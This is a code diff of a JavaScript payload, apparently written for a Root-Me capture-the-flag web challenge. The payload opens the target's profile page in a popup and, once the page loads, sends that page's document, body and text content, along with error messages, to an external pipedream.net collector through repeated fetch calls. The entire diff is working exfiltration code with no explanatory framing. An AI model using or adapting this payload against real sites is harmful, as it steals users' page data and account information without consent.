@@ -15,37 +15,43 @@ try{
 
 try{
 	var aaa = open('http://challenge01.root-me.org:58003/profile', '_blank', 'popup');
-	var bb = aaa.document
-	try{
-		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?docunew=' + bb, {mode: 'no-cors'});
 
-
+	aaa.onpageshow = function() {
+    	
+		var bb = aaa.document
 		try{
-			var coo = aaa.document.body.childElementCount
-			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=' + coo, {mode: 'no-cors'});
-			
-		} catch (error) {
-	  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr6='+error, {mode: 'no-cors'})
-		}
+			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?docunew=' + bb, {mode: 'no-cors'});
 
-
-		try{
-			var cc = aaa.document.body
-			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?bodynew=' + cc, {mode: 'no-cors'});
 
 			try{
-				var dd = aaa.document.body.textContent
-				fetch('https://en6gc9c8vfzvo.x.pipedream.net/?documentnewtext=' + dd, {mode: 'no-cors'});
+				var coo = aaa.document.body.childElementCount
+				fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=' + coo, {mode: 'no-cors'});
 				
 			} catch (error) {
-		  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr5='+error, {mode: 'no-cors'})
+		  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr6='+error, {mode: 'no-cors'})
+			}
+
+
+			try{
+				var cc = aaa.document.body
+				fetch('https://en6gc9c8vfzvo.x.pipedream.net/?bodynew=' + cc, {mode: 'no-cors'});
+
+				try{
+					var dd = aaa.document.body.textContent
+					fetch('https://en6gc9c8vfzvo.x.pipedream.net/?documentnewtext=' + dd, {mode: 'no-cors'});
+					
+				} catch (error) {
+			  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr5='+error, {mode: 'no-cors'})
+				}
+			} catch (error) {
+		  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr4='+error, {mode: 'no-cors'})
 			}
 		} catch (error) {
-	  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr4='+error, {mode: 'no-cors'})
+	  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr3='+error, {mode: 'no-cors'})
 		}
-	} catch (error) {
-  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr3='+error, {mode: 'no-cors'})
-	}
+    	
+ 	};
+	
 	
 } catch (error) {
   	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr2='+error, {mode: 'no-cors'})
